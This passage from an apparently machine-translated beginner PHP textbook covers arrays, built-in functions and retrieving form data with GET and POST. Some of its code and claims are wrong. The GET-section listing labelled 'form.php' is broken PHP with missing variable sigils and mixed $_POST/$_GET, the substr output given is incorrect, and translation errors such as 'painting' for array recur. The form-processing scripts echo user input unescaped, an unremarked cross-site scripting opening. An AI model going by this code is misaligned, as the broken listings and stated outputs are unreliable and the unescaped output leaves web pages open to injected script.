### Browse a multidimensional array

 

To traverse a multidimensional array in PHP, we generally use a combination of **foreach** loops. As we saw earlier, multidimensional arrays are made up of nested arrays, and each array level can be traversed individually using foreach loops.

 

Let's take the example of the $country\_information table we saw earlier:

 

<?php  
  
$country\_information =\[  
 \["country" => "France" , "capital" => "Paris" , "inhabitants" => 67\],  
 \["country" => "Canada" , "capital" => "Ottawa" , "inhabitants" => 38\],  
 \["country" => "Morocco" , "capital" => "Rabat" , "inhabitants" => 40\],  
 \["country" => "Spain" , "capital" => "Madrid" , "inhabitants" => 47\]  
\];  
  
 foreach ($country\_information as $country) {  
 foreach ($country as $key => $value) {  
 echo "$key: $value <br>";  
 }  
 echo "<br>";  
}  
  
?>

 

This nested foreach loop first traverses each element of the $country\_information array, then, on each iteration, it traverses each internal element (key-value) of the array associated with the current country. The "echo" instruction is used to display each key:value pair. If you run this code, you'll get a result similar to the following:

 

![Image](images/image-91.png)

 

 

## Conclusion

In this chapter, we've explored in detail the various facets of manipulating arrays in PHP, which are fundamental data structures in programming. We've learned how to declare and initialize arrays, access their elements, traverse them using loops, and understand the different array types, such as indexed, associative and multidimensional arrays.

 

We also looked at common table operations, such as adding, modifying, and deleting elements, as well as best practices for organizing and manipulating data in tables."

Finally, we explored advanced array functionalities, such as multidimensional arrays and associative arrays, and learned how to use them effectively in our PHP programs.

 

By combining this knowledge with the concepts we've previously explored, such as functions and loops, we now have a solid understanding of array manipulation in PHP, which will enable us to create robust and dynamic PHP applications.

 

 

 

## EXERCISES

 

### Exercise 15

 

Write a PHP script that stores a list of names in an array, then displays these names in a bulleted list.

 

### Exercise 16

 

Write a PHP script that stores the names of three colors in an array and displays them in reverse order.

 

### Exercise 17

 

Write a PHP script that stores a list of names in an array and displays them in alphabetical order.

 

### Exercise 18

 

Write a PHP script that creates an associative array of fruit names and prices and displays each element of the array with a foreach loop.

 

### Exercise 19

Write a multidimensional associative array whose keys are people's names and values are numbered arrays containing the person's first name, city and age.

Then use this table to display a sentence for each of these people, giving the person's first and last name and age.

 

### Exercise 20: function and array (foreach)

 

Write a PHP function that takes an array of numbers as input and returns the sum of all these numbers.

 

### Exercise 21: function and array (foreach)

 

Write a function that takes an array of numbers as a parameter and returns the sum of all even numbers in the array.

 

### Exercise 22: functions and tables (averaging)

 

Write a function that takes an array of numbers as a parameter and returns the average of all even numbers in the array.

 

### Exercise 23: functions and tables (find max)

 

Write a function that takes an array of numbers as a parameter and returns the max of all the numbers in the array.

 

# Chapter 6

# PHP built-in functions

 

PHP's built-in functions, also known as predefined functions or native functions, are functions that are included in the PHP language by default. They provide a wide range of ready-to-use functionality for common programming tasks, such as mathematical operations, string manipulation, date and time processing, array management, file access and much more. Whether you're developing a dynamic website, a complex web application, or any other PHP project, these built-in functions let you accomplish a multitude of tasks in an efficient, streamlined way.

 

In this chapter, we'll explore some of PHP's built-in function categories and discover how to use them to meet a variety of web development needs. We'll dive into mathematical functions to perform complex calculations, string functions to manipulate and format text, array functions to manage data sets, and date and time functions to manage time accurately.

 

This chapter will provide you with an in-depth understanding of the features offered by PHP's built-in functions, as well as practical examples to illustrate their use in different web development contexts. Get ready to dive into the world of PHP's built-in functions and discover how they can simplify and accelerate your web development process.

 

 

## Mathematical functions

PHP's built-in mathematical functions offer a variety of tools for performing common mathematical operations. From simple calculations to more advanced operations, PHP offers a full range of functions to meet the needs of developers. In this section, we'll explore some of the most commonly used mathematical functions available in PHP.      

 

### Basic functions

 

PHP's basic functions provide essential tools for performing simple mathematical operations. They are widely used in web development to perform basic calculations and manipulate numbers. The table below summarizes some of the most commonly used basic functions:

 

 

![Image](images/image-92.png)

 

 

*   **abs()** : This function returns the absolute value of a number, i.e. its value without sign. For example:

 

 

 $number = -10;

  
 $absolute\_value \= abs($number); // $absolute\_value is 10

 

 

*   **sqrt()** : The sqrt() function returns the square root of a number. For example:

 

 

 $number = 25;  
 $quare\_root \= sqrt($number); // square\_root is 5

 

 

*   **pow()** : This function returns the value of a number raised to the power of another number. For example:

 

 

 $number \= 2;  
 $power \= 3;  
 $result \= pow($number, $power); // $result is 8 (2^3)

 

 

*   **round()** : The round() function rounds a number to the nearest decimal place according to the specified precision. Here's an example:

 

<?php  
  
 $number1 = 3.7;  
 $arrondi\_number1 = round($number1); // $arrondi is 4  
  
 $number2 = 12.146345;  
 $arrondi\_number2 = round($number2, 2); // round $number2 to 2 decimal places, result is 12.15  
  
 echo $arrondi\_number1;  
 echo "<br>";  
 echo $arrondi\_number2;  
?>

 

 

Result:

 

![Image](images/image-93.png)

 

These basic functions are useful in many programming situations where simple operations on numbers are required. They offer flexibility and ease of use for performing basic mathematical calculations in PHP.

 

### Trigonometric functions

 

In PHP, trigonometric functions are integrated to make it easier for developers to perform trigonometric calculations efficiently and accurately. The table below provides an overview of some of these functions.

 

![Image](images/image-94.png)

###  

### Random functions

 

PHP's random functions can be used to generate random numbers and perform random operations in applications. They are widely used in games, simulations, random data generation and more. Here are some of the most commonly used random functions in PHP :

 

Random number generation :

 

*   **rand($min, $max**): This function generates a random number between the values $min and $max. The value returned is an integer.

 

Example:

 

<?php  
 $random\_number = rand(1, 100);  
 echo "Random number between 1 and 100: $random\_number";  
?>

 

Each time you run this code, you'll get a random number between 1 and 100.

 

*   **mt\_rand($min, $max):** Similar to rand(), but uses a **Mersenne Twister** random number generator, renowned for its better random number distribution.

Example:

 

<?php  
  
 $random\_number = mt\_rand(1000, 9999);  
 echo "Random 4-digit PIN code: $random\_number";  
?>

 

## String functions

String functions in PHP offer a variety of tools for efficiently manipulating and processing strings. Here are some of the most commonly used functions in this category:

 

strlen() : This function returns the length of a character string.

 

Example:

 

<?php  
  
 $text = "Hello";  
 $length = strlen($text); // $length is 5  
  
 echo $length;  
  
?>

 

Result:

 

![Image](images/image-95.png)

 

strpos() : This function returns the position of the first occurrence of a substring in a string.

 

Example:

 

 $text \= "Good morning";  
 $position \= strpos($text, "mor"); // $position is 5

 

In this example, we have a string "$texte" containing the value "Good morning". The "strpos()" function is used to find the position of the first occurrence of the substring "mor" in the string "$text". As "mor" starts at the five position in "Good morning", the "strpos()" function returns the value 5, which is the starting position of the sub-string "mor" in the string "$texte". Note that position indexing starts from zero. The letter "G" has index 0, the letter "o" has index 1, the second letter "o" has index 2, the letter "d" has index 3, the space has index 4, and the letter "m" has index 5.

 

substr() : This function returns a substring of a given string from the specified position and length.

 

Example:

 

<?php  
  
 $text = "Hello everyone";  
 $substring = substr($text, 3, 10); // $substring is "lo evryon".  
 echo $substring;  
  
?>

 

In this example, we have a string "$texte" containing the value " Hello everyone". The **"substr()"** function is used to extract a substring from "$text". The function's parameters are as follows: the first parameter is the original string ("$text"), the second parameter is the starting position of the extraction (3 in our case, which means from the fourth character of the string $text, as indices start at zero), and the third parameter is the length of the substring to be extracted (10 characters in our case). Thus, the "substr()" function extracts a substring from "$text" starting from the third position with a length of ten characters, giving "**lo evryon**". Spaces are also characters to be taken into account.

 

Result:

 

![Image](images/image-96.png)

 

strtoupper() and strtolower() : These functions convert a string to upper or lower case respectively.

 

Example:

 

<?php  
 $text = "Hello everyone";  
 $upper\_text = strtoupper($text); // $upper\_text is "HELLO EVERYONE".  
  
 $lower\_text = strtolower($text); // $lower\_text is "hello everyone".  
  
 echo $upper\_text;  
 echo "<br>";  
 echo $lower\_text;  
?>

 

 

![Image](images/image-97.png)

 

str\_replace(): This function replaces all occurrences of a substring with another in a string.

 

Example:

 

<?php  
 $text = "Hello everyone";  
 $new\_text = str\_replace("everyone", "friends", $text);  
 echo $new\_text;  
?>

 

In this code, the str\_replace() function will replace the string "everyone" in the string $text with the string "friends". If you run this code, you'll get the following result:

 

![Image](images/image-98.png)

 

In short, these functions are just a few examples of the many others available in PHP to manipulate strings efficiently and flexibly.

## Functions for tables

Array manipulation is a common task in PHP, and the built-in functions provided by the language make it much easier. Here are some of the most frequently used functions for working with arrays :

 

 
| Functions || Meaning |
| --- | --- |
| count() || Count the number of elements in an array |
| sort() || Sort a table in ascending order |
| rsort() || Sort a table in descending order |
| array\_push() || Additions one or more elements to the end of an array |
| array\_unshift() || Additions one or more elements to the beginning of an array |
| array\_pop() || Deletes the last element of an array |
| array\_shift() || Deletes the first element of an array |
| array\_slice() || Extract part of a painting |
| array\_merge() || Merges one or more arrays |
| array\_key\_exists() || Checks whether a key exists in an array |
| in\_array() || Checks whether a given value exists in an array |
| array\_search() || Searches for a given value in an array and returns the corresponding key |
| array\_replace() || Replaces the elements of an array with those of one or more other arrays |

 

*   The **sort()** function: sorts an array in ascending order of values. It directly modifies the array in place and returns a Boolean indicating the success of the operation. Here's an example:

 

<?php  
 $fruits = \["orange", "apple", "banana", "strawberry"\];  
 sort($fruits);  
  
 echo "<pre>";  
 print\_r($fruits);  
 echo "</pre>";  
?>

 

In this example, the $fruits array is sorted in ascending order, resulting in :

 

![Image](images/image-99.png)

 

*   The **array\_push()** function is used to addition one or more elements to the end of an array. It directly modifies the array in place and returns the new number of elements in the array. Here's an example:

 

<?php  
  
 $fruits = \["orange", "apple", "banana", "strawberry"\];  
 array\_push($fruits, "Pineapple", "kiwi");  
  
 echo "<pre>";  
 print\_r($fruits);  
 echo "</pre>";  
?>

 

 

In this example, the elements "Pineapple" and "Kiwi" are appended to the end of the array $fruits, resulting in:

 

![Image](images/image-100.png)

 

The **array\_pop()** function deletes the last element of an array and returns this element. It directly modifies the current array. Here's an example:

 

 

<?php  
 $fruits = \["orange", "apple", "banana", "strawberry"\];  
 $last\_fruit = array\_pop($fruits);  
 echo "The last fruit was: " . $last\_fruit . "<br>";  
 echo "<pre>";  
 print\_r($fruits);  
 echo "</pre>";  
?>

 

In this example, the **array\_pop()** function deletes the last element of the $fruits array, which is "strawberry". The variable $last\_fruit now contains the value "strawberry", and the array $fruits is modified as follows:

 

![Image](images/image-101.png)

 

*   The **array\_slice()** function returns a portion of the given array according to the specified parameters. It does not modify the original array, but returns a new version of the array with the selected elements.

 

Here is the general syntax of the array\_slice() function:

 

![Image](images/image-102.png)

 

*   $array: The original table from which to extract a portion.
*   $start: The starting index from which to extract elements.
*   $length: The number of elements to be extracted. If this parameter is omitted, all elements from $start will be included.
*   $preserve\_keys: A Boolean indicating whether associative keys should be retained in the resulting array. By default, keys are re-indexed from zero.

Here's an example of how to use array\_slice():

 

<?php  
 $fruits = \["apple", "banana", "orange", "strawberry", "pineapple"\];  
 $portion = array\_slice($fruits, 1, 3);  
  
 echo "<pre>";  
 print\_r($portion);  
 echo "</pre>";  
?>

 

This example extracts a portion of the $fruits array from index 1 (second element, "banana") and includes the next three elements. The resulting array $portion will contain the elements "banana", "orange" and "strawberry". Note that the original $fruits array is not modified. Note that if we don't specify the number of elements to be extracted, all elements from $start will be extracted.

 

![Image](images/image-103.png)

 

*   The **array\_merge()** function is used to merge two or more arrays into a single one. It takes into account the arrays given as arguments and returns a new array containing all the elements of the source arrays.

Here is the general syntax of the array\_merge() function:

![Image](images/image-104.png)

 

**tab1, $tab2, … $tabn**: The tables to be merged. You can supply several tables separated by commas.

 

Here's an example of how to use array\_merge() :

 

<?php  
 $tab1 = \["a" => "apple", "b" => "banana"\];  
 $tab2 = \["c" => "orange", "d" => "strawberry"\];  
 $tab3 = \["e" => "ananas"\];  
  
 $result = array\_merge($tab1, $tab2, $tab3);  
 echo "<pre>";  
 print\_r($result);  
 echo "</pre>";  
?>

 

In this example, the **array\_merge()** function merges the arrays $tab1, $tab2 and $tab3 into a single array $result. The merged array will contain all the elements of the source arrays, with the keys retained if they are unique, otherwise the keys will be re-indexed from zero. Executing this code will produce the following result:

 

![Image](images/image-105.png)

 

*   The **array\_key\_exists()** function is used to check whether a specific key exists in a given array. It returns true if the key exists and false otherwise.
*    

Here is the syntax of the array\_key\_exists() function:

 

![Image](images/image-106.png)

 

key: The key to search for in the table.

$tab: The table in which to search for the key.

Here's an example of how to use array\_key\_exists() :

 

<?php  
  
 $person = \[  
 "lastname" => "Dupont",  
 "firstname" => "John",  
 "age" => 30  
 \];  
  
 if (array\_key\_exists("firstname", $person)) {  
 echo "The key 'firstname' exists in the array person.";  
 } else {  
 echo "The key 'firstname' does not exist in the array person.";  
 }  
  
?>

 

In this example, the **array\_key\_exists()** function checks whether the key "firstname" exists in the $person array. As the key "firstname" exists in the array, the condition is true and the message "The key 'firstname' exists in the array person." is displayed.

 

*   The **array\_replace()** function is used to replace the elements of an array with the elements of one or more other arrays. It replaces existing key values in the first array with the corresponding values in the replacement arrays, and additions non-existent keys.

Here is the syntax of the array\_replace() function:

![Image](images/image-107.png)

 

**$tab1**: The array whose elements are to be replaced.

**$tab2, $Other\_arrays** Replacement tables. You can specify as many tables as required.

The function returns a new array containing the updated elements.

 

Here's an example of how to use array\_replace() :

 

<?php  
 $array1 = \["a" => "red", "b" => "green", "c" => "blue"\];  
 $array2 = \["b" => "yellow", "d" => "orange"\];  
  
 $new\_array = array\_replace($array1, $array2);  
  
 echo "<pre>";  
 print\_r($new\_array);  
 echo "</pre>";  
?>

 

In this example, the array $array1 is replaced by the values in the $array2 array. The "b" keys of $array1 and $array2 both exist, so the value of key "b" in $new\_array will be replaced by the value of $array2. Keys "a", "c", and "d" are only present in one of the arrays, so they will be added to $new\_array.

 

![Image](images/image-108.png)

 

## Functions for Dates and Times

In PHP, there are many built-in functions that facilitate the manipulation of dates and times. These functions can be used to format dates, perform arithmetic operations on dates, calculate the difference between two dates, and much more.

 

Here are some of the most commonly used functions for working with dates and times:

 

*   **The date(format, timestamp) function**: returns a formatted string representing the current date and time, or the date and time specified by the timestamp. The format parameter defines the format of the output string, while the timestamp parameter (optional) specifies the Unix timestamp to be used as the basis for conversion. If the timestamp parameter is not supplied, the function uses the current timestamp.

 

  
<?php  
  
 // Gets the current date in "d-m-Y H:i:s" format  
 $currentDate = date("d-m-Y H:i:s");  
 echo $currentDate . "<br>";  
  
 // Gets current date in "d/m/Y" format   
 $currentDate2 = date("d/m/Y");  
 echo $currentDate2 . "<br>";

  
  
?>

 

In these examples, the **date()** function is used to format the current date. If you run this code, you'll get a result similar to the following:

 

![Image](images/image-109.png)

 

 

*   **The getdate() function** returns an associative array containing information about the current date. Here's an example:

 

<?php  
  
 $currentdate = getdate();  
  
 echo "<pre>";  
 print\_r($currentdate);  
 echo "</pre>";  
  
?>

 

This code returns an associative array containing elements such as the year, month, day, etc., of the current date.

 

![Image](images/image-110.png)

 

*   **"seconds**": Current seconds (from 0 to 59)
*   **"minutes**": Current minutes (from 0 to 59)
*   **"hours**": The current time in 24-hour format (from 0 to 23).
*   **"mday**": Day of the current month (from 1 to 31)
*   "**wday**": Current day of the week (from 0 for Sunday to 6 for Saturday)
*   **"my**": The current month (from 1 to 12)
*   "**year**": Current year (in full format, e.g. 2024)
*   "**yday**": Current day of the year (from 0 to 365)
*   "**weekday**": The full name of the current day of the week (e.g. "Monday").
*   "**month**": The full name of the current month (e.g. "February")
*   "**0**": A Unix timestamp representing the current date

 

These elements provide precise details of the current date and time.

*   PHP's **time()** function returns the number of seconds elapsed since midnight UTC (Unix time) on January 1, 1970. It takes no parameters.

 

Example:

 

<?php  
 $current\_time = time();  
 echo "The time in seconds since the Unix epoch: $current\_time";  
?>

Running this code returns the current time in seconds since 01/01/1970 :

 

![Image](images/image-111.png)

 

This function is often used to measure durations, calculate time intervals or for other time-based operations.

 

*   **The strtotime() function** in PHP is used to parse textual dates into a Unix timestamp value, representing the number of seconds elapsed since January 1, 1970 at 00:00:00 UTC (Unix time). Here are a few examples of its use:

 

<?php  
  
 $date\_text = "2023-08-29";  
 $timestamp = strtotime($date\_text);  
 echo "The timestamp for the date $date\_text is: $timestamp";  
  
?>

 

This code will produce a result similar to the following:

 

![Image](images/image-112.png)

 

Example of how to calculate the time between two specific dates :

 

You can use the **strtotime()** function to obtain the timestamps of these dates, then subtract the corresponding timestamps to obtain the difference in seconds. You can then convert this difference into days, hours, minutes, etc. as required.

Here is an example of how to calculate the duration between the dates 02/15/1996 and 08/29/2024 :

 

<?php  
 // Start date timestamp (02/15/1996 at 00:00:00)  
 $departure\_date = strtotime("1996-02-15");  
  
 // Timestamp of arrival date (29/08/2024 at 00:00:00)  
 $arrival\_date = strtotime("2024-08-29");  
  
 // Calculate difference in seconds  
 $difference\_seconds = $arrival\_date - $departure\_date;  
  
 // Display duration in seconds  
 echo "Duration in seconds between 02-15-1996 and 08-29-2024: $difference\_seconds";  
?>

 

This code will produce a result similar to :

![Image](images/image-113.png)

 

## Conclusion

It's important to note that PHP offers a vast array of predefined functions to accomplish a multitude of tasks, from mathematical operations and string manipulation to array manipulation and date/time management, among others. It would be impossible to cover all these functions exhaustively in a single book.

 

The aim of this chapter was to provide you with representative examples of the different categories of functions built into PHP, so that you can understand their basic use and operation. It's essential to note that the aim was not to teach you all the functions by heart, but rather to familiarize you with their existence and usefulness.

 

As a developer, it's essential to develop the ability to search and consult official PHP documentation or other online resources whenever you need to use a specific function. This is an integral part of the software development process and will enable you to explore the features and possibilities offered by the PHP language on your own.

 

 

# SECTION B

# ADVANCED DATA MANAGEMENT AND BROWSER INTERACTION

 

 

In this section, we explore advanced aspects of data manipulation and browser interaction. We'll dive into advanced techniques that will enable you to create more dynamic and interactive web applications.

 

**Chapter 7**: In this chapter we'll look at processing data from browsers using GET and POST methods. We'll look at how to retrieve data from forms and use it in our PHP scripts to create interactive features in our web applications.

 

**Chapter 8:** Images and files: This chapter focuses on the management of multimedia resources such as images and files in web applications. It examines best practices for storing, loading and manipulating images and files on the server side. 

 

**Chapter 9:** Session and cookie management: This chapter explores mechanisms for managing the state of user sessions in web applications. It covers in detail the use of cookies to store client-side information, as well as server-side session management techniques.

 

 

# Chapter 7

# Browser data processing (GET, POST)

 

So far, we've explored a number of fundamental concepts that form the basis of our future learning. If this is your first foray into server-side programming, it's normal to feel a little disoriented at first. It's also possible that you won't fully grasp the usefulness of variables, conditions, loops, functions, arrays and so on. This is understandable, as up to now we've mainly used values that we've defined ourselves. In other words, we've initialized variables with predetermined values in our examples.

 

However, in the rest of our course, we'll be working with variables whose values we don't define ourselves in advance. For example, we're going to learn how to retrieve information entered by the user via a form, and you'll fully understand the importance of what we've learned so far.

 

This chapter of our book focuses on processing data from browsers, with particular emphasis on GET and POST methods. When we interact with websites, we often transmit information such as form parameters or URL identifiers. This data is essential for personalizing user experiences, performing searches, or managing user sessions, among other things.

 

This chapter will provide you with the knowledge you need to effectively manipulate browser data in your PHP projects, paving the way for the creation of more dynamic and interactive web applications.

 

 

## Transferring and processing form data in PHP

To retrieve data entered by a user in a form, there are two main approaches:

The first method consists in creating two separate files: an HTML file containing the form and a PHP file responsible for processing the data submitted by this form.

The second method consists in combining both the HTML form code and the PHP processing code in a single PHP file.

 

Initially, we'll concentrate on the first configuration, where two separate files are used. The first file, named "form.php" for example, will contain the form, while the second file, named "processingform.php" for example, will be responsible for processing the data transmitted by this form.

 

![Image](images/image-114.png)

 

In the ebbokphp directory, create these two files :

 

![Image](images/image-115.png)

 

### Creating a form

 

Let's create a form in the form.php file:

 

<!DOCTYPE html\> <html lang\="en">  
<head\>  
<meta charset\="UTF-8">  
<title\>Form </title\>  
</head\>  
<body\>  
  
<form action\="processingform.php" method\="post">  
 <fieldset\>  
 <legend\>Personal information:</legend\>  
 <label for\="lastname">Last Name:</label\><br\>  
 <input type\="text" id\="lastname" name\="lastname"><br\>  
 <label for\="firstname">First Name:</label\><br\>  
 <input type\="text" id\="firstname" name\="firstname"><br\>  
 <label for\="email">Email address:</label\><br\>  
 <input type\="email" id\="email" name\="email"><br\>  
 <label for\="country">Country:</label\><br\>  
 <select id\="country" name\="country">  
 <option value\="France">France</option\>  
 <option value\="Morocco">Morocco</option\>  
 <option value\="Spain">Spain</option\>  
 <option value\="Canada">Canada</option\>  
 <option value\="Belgium">Belgium</option\>  
 </select\><br\><br\>  
 <input type\="submit" value\="Send">  
 </fieldset\>  
 </form\>  
  
</body\>  
</html\>

 

 

This form is designed with a **fieldset** captioned "Personal information", and includes the following fields: "Last name", "First name", "Email address" and "Country".

 

**Input** fields are form elements used to enter user data. The type attribute defines the type of field, such as "text" for text fields like "Last name" and "First name", and "email" for an e-mail address field. The id attribute is used to associate the corresponding label, while the name attribute is essential for identifying the field data when the form is submitted.

 

The **select** and **option** elements are used for drop-down lists. The **select** tag creates a drop-down list, while the option tag defines each option in the list. The value attribute of each option is the value sent to the server upon selection.

 

The "**submit"** input button allows the user to submit the form. The value attribute defines the text displayed on the button, in this case "Submit".

 

The **form** tag frames all the elements of the form. The **action** attribute specifies the URL of the data processing script (in this example, " processingform.php"), while the **method** attribute defines the HTTP method used to send the data (here, POST).

 

To retrieve data sent from an HTML form, PHP provides two methods: **GET** and **POST**, accessible via the superglobal variables $\_GET and $\_POST. These superglobals are used to retrieve the values of form fields, as we'll see later.

 

![Image](images/image-116.png)

 

### Data retrieval using the POST method in PHP

 

Once the form has been created in the form.php file, the process of retrieving the transmitted data is as follows:

 

When the user submits the form by clicking on the "Send" button, the data is sent to the server.

 

The server receives the data and transmits it to the processing file specified in the form's "**action**" attribute (in this case, "processingform.php").

 

In the processingform.php file, we retrieve the data transmitted via the $\_GET or $\_POST superglobal variables, depending on the method used in the form (in this example, POST).

 

We then process this data according to the needs of the application, such as validation, manipulation, storage in a database, and so on.

 

Here's an example of code for the file processingform.php, which assumes that the form uses the POST method to send data:

 

<?php  
  
 // Retrieve form data  
 $lastname = $\_POST\["lastname"\];  
 $firstname = $\_POST\["firstname"\];  
 $email = $\_POST\["email"\];  
 $country = $\_POST\["country"\];  
  
 // Example of data processing (display)  
 echo "Last Name : " . $lastname . "<br>";  
 echo "First Name : " . $firstname . "<br>";  
 echo "Email : " . $email . "<br>";  
 echo "Country : " . $country . "<br>";  
  
?>

 

In this code, variables such as $lastname, $firstname, $email and $country are used to store the values entered in the form fields. Each variable is associated with a specific key in the $\_POST superglobal, which corresponds to the “**name”** attribute of the form fields.

 

Data is retrieved from the **$\_POST** superglobal using the keys associated with the form fields. For example, $\_POST\["lastname"\] retrieves the value of the field with the name attribute equal to "lastname".

 

Once the data has been retrieved, it is processed or displayed according to the needs of the application. In this example, the data is simply displayed on the screen using the echo function.

 

Each form field is displayed with its corresponding label to make it easier to read and understand the data entered by the user.

 

In short, this PHP code retrieves data submitted via an HTML form, stores it in appropriate variables and displays it on screen for demonstration or further processing.

To test this code, simply fill in the form in the form.php file and validate it by clicking on the "Send" button. You will obtain a result similar to the following:

 

![Image](images/image-117.png)

 

Warning

 

If you try to access the processingform.php file directly, you'll get errors similar to the following:

 

![Image](images/image-118.png)

 

In fact, when you try to access the file processingform.php directly, without passing through the form that sends data via the POST method, you'll get this type of error. This is because the PHP code in processingform.php attempts to access form field values from the $\_POST superglobal, but since these values are not sent via POST when accessing the file directly, PHP cannot find them in $\_POST.

 

In other words, when you access processingform.php directly, there's no data sent via POST, so indexes such as "last name", "first name", "email" and "country" don't exist in the $\_POST superglobal. As a result, when PHP tries to access these non-existent indexes, it generates errors.

 

To avoid these errors, it's important to addition tests to check whether the data is available in $\_POST before attempting to retrieve it. Let's modify the code in the file processingform.php as follows:

 

<?php  
 

 // Check whether data has been sent via POST  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "POST") {  
 

 // Retrieve form data  
 $name \= $\_POST\["lastname"\];  
 $firstname \= $\_POST\["firstname"\];  
 $email \= $\_POST\["email"\];  
 $country \= $\_POST\["country"\];  
  
 // Example of data processing (display)  
 echo "Name : " . $name . "<br\>";  
 echo "First name : " . $firstname . "<br>";  
 echo "Email : " . $email . "<br>";  
 echo "Country : " . $country . "<br\>";  
 }else{  
 // Display an error message if the request method is not POST  
 echo "Error: Access not authorized.";  
 }  
?>

 

With this approach, you first check whether data has been sent via POST using $\_SERVER\["REQUEST\_METHOD"\] == "POST". If the request method is not POST, you can display an appropriate error message to inform the user.

 

In other words, if you try to access the processingform.php file directly, you'll get the message displayed in the **else** block; otherwise, if you go through the form in the form.php file, you'll get the data entered displayed.

 

For example:

 

![Image](images/image-119.png)

 

We can further optimize our code by performing a pre-check to ensure that all expected data is available in the $\_POST variable. For example, we can check that all the required fields are filled in, and that the email field contains a valid email address, in line with email address standards (in particular, by checking for the presence of the "@" symbol). This will improve the robustness and reliability of our processing of the data entered in the form. Here is the updated code:

 

<?php  
  
 // Check whether data has been sent via POST  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "POST") {  
 // Check if expected data is available in $\_POST  
 if (empty($\_POST\["lastname"\])) {  
 echo "Please enter your last name!";  
 } elseif (empty($\_POST\["firstname"\])) {  
 echo "Please enter your first name!";  
 } elseif (empty($\_POST\["email"\]) || !filter\_var($\_POST\["email"\], FILTER\_VALIDATE\_EMAIL)) {  
 echo "Please enter a valid email!";  
 } elseif (empty($\_POST\["country"\])) {  
 echo "Please select your country!";  
 } else {  
 // Retrieve form data  
 $lastname = $\_POST\["lastname"\];  
 $firstname = $\_POST\["firstname"\];  
 $email = $\_POST\["email"\];  
 $country = $\_POST\["country"\];  
  
 // Example of data processing (display)  
 echo "Last Name : " . $lastname . "<br>";  
 echo "First Name : " . $firstname . "<br>";  
 echo "Email : " . $email . "<br>";  
 echo "Country : " . $country . "<br>";  
 }  
 } else {  
// Display an error message if the request method is not POST  
 echo "Error: Access not authorized";  
 }  
  
?>

 

This PHP code first checks whether data has been sent via the POST method by checking the value of $\_SERVER\["REQUEST\_METHOD"\]. It then checks whether the expected data is available in $\_POST. If any of the following conditions are not met, an appropriate error message is displayed:

 

*   If the "last name" field is empty, the message "Please enter your last name!" is displayed.
*   If the "first name" field is empty, the message "Please enter your first name!" is displayed.
*   If the "email" field is empty or does not contain a valid email address (checked using FILTER\_VALIDATE\_EMAIL), the message "Please enter a valid email!" is displayed.
*   If the "country" field is empty, the message "Please choose your country!" is displayed.

 

If all conditions are met, i.e. if all required fields are filled in and the e-mail address is valid, the form data is retrieved from the variables $lastname, $firstname, $email and $country. Finally, an example of data processing is performed, where the values of these variables are displayed for demonstration purposes.

 

If the request method is not POST, i.e. the data has not been submitted via a form, an "Error: Access not authorized" error message is displayed.

 

Note that the **filter\_var** function in PHP is used to filter a variable with a specific filter. It takes two arguments: the variable to be filtered and the filter to be applied.

 

In this example, **FILTER\_VALIDATE\_EMAIL** is used as a filter to check whether a variable contains a valid email address. This filter is designed to validate email address according to standard format norms. If the variable does not contain a valid email address, the filter\_var function returns false, otherwise it returns the email address.

 

In summary, filter\_var($\_POST\["email"\], FILTER\_VALIDATE\_EMAIL) checks whether the variable $\_POST\["email"\] contains a valid email address according to standard format standards. If so, it returns the email address, otherwise it returns false.

 

### Retrieving data using the GET method in PHP

 

The GET method is commonly used to send data from a form to a PHP script by appending it to the URL, especially when the data is not sensitive and does not contain confidential information. This data is visible in the browser URL and can be retrieved and processed on the server side.

 

To retrieve data sent via the GET method in PHP, we use the $\_GET superglobal. This superglobal contains an associative array of the parameters passed in the URL. Parameters are retrieved using the names defined in the URL.

 

We'll explore how to use $\_GET to retrieve URL parameter values, and how to use them in our PHP script to perform various operations.

 

To do this, we return to the previous example. In the form.php file, replace the "post" method of the method attribute with "get". In processingform.php, replace all occurrences of $\_POST with $\_GET.

 

form.php:

 

<?php  
 

 // Check whether data has been sent via POST  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "GET") {  
 

 // Retrieve form data  
 $name \= $\_POST\["lastname"\];  
 firstname \= $\_POST\["firstname"\];  
 $email \= $\_POST\["email"\];  
 country \= $\_POST\["country"\];  
  
 // Example of data processing (display)  
 echo "Name : " . $name . "<br\>";  
 echo "First name : " . $firstname . "<br>";  
 echo "Email : " . $email . "<br>";  
 echo "Country : " . $country . "<br\>";  
 }else{  
 // Display an error message if the request method is not POST  
 echo "Error: Access not authorized.";  
 }  
  
?>

 

Processingform.php:

 

<?php  
  
 // Check whether data has been sent via POST  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "GET") {  
 // Check if expected data is available in $\_GET  
 if (empty($\_GET\["lastname"\])) {  
 echo "Please enter your last name!";  
 } elseif (empty($\_GET\["firstname"\])) {  
 echo "Please enter your first name!";  
 } elseif (empty($\_GET\["email"\]) || !filter\_var($\_GET\["email"\], FILTER\_VALIDATE\_EMAIL)) {  
 echo "Please enter a valid email!";  
 } elseif (empty($\_GET\["country"\])) {  
 echo "Please select your country!";  
 } else {  
 // Retrieve form data  
 $lastname = $\_GET\["lastname"\];  
 $firstname = $\_GET\["firstname"\];  
 $email = $\_GET\["email"\];  
 $country = $\_GET\["country"\];  
  
 // Example of data processing (display)  
 echo "Last Name : " . $lastname . "<br>";  
 echo "First Name : " . $firstname . "<br>";  
 echo "Email : " . $email . "<br>";  
 echo "Country : " . $country . "<br>";  
 }  
 } else {  
 // Display an error message if the request method is not POST  
 echo "Error: Access not authorized";  
 }  
  
?>

 

 

When you fill in your form and submit it by clicking on the "Send" button, you'll get a result similar to this one:

 

![Image](images/image-120.png)

 

Please note that the content of your form has been transmitted via your browser's URL address. In other words, the GET method sends the data as a query string in the URL, making it easy to view and share.

 

However, it's important to note that the GET method is not recommended for sending sensitive data, such as passwords, as this data is visible in the URL and can be intercepted by third parties. In such cases, the POST method is preferable, as it sends the data in the body of the HTTP request, making it less visible.

 

In address, the GET method has several limitations compared to the POST method:

 

**Data size limit** : Data transmitted via the GET method is limited in size, as it is included in the URL. This can be a problem for large or sensitive data.

 

**Data security:** Since data is visible in the URL, it can easily be intercepted and read by third parties. This can compromise the security of sensitive data such as passwords or personal information.

 

**Special character restrictions**: Certain special characters must be encoded in the URL, which can lead to errors or data loss if not handled correctly.

 

**Browser cache**: Data transmitted via the GET method may be cached by the browser, which can lead to confidentiality problems if the user shares the URL containing sensitive data.

 

